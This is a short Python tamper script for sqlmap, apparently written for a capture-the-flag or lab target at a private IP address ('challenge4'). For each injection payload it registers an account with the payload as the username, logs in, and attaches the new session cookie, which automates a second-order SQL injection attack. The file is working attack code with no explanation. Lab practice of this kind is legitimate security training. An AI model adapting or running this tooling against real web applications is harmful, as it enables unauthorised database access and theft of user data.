#!/usr/bin/python
import requests
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

address = "http://10.10.159.71:5000/challenge4"
password = "asd"

def dependencies():
    pass

def create_account(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/signup", data=data)

def login(payload):
    with requests.Session() as s:
        data = {"username": payload, "password": password}
        resp = s.post(f"{address}/login", data=data)
        sessid = s.cookies.get("session", None)
    return "session={}".format(sessid)


def tamper(payload, **kwargs):
    headers = kwargs.get("headers", {})
    create_account(payload)
    headers["Cookie"] = login(payload)
    return payload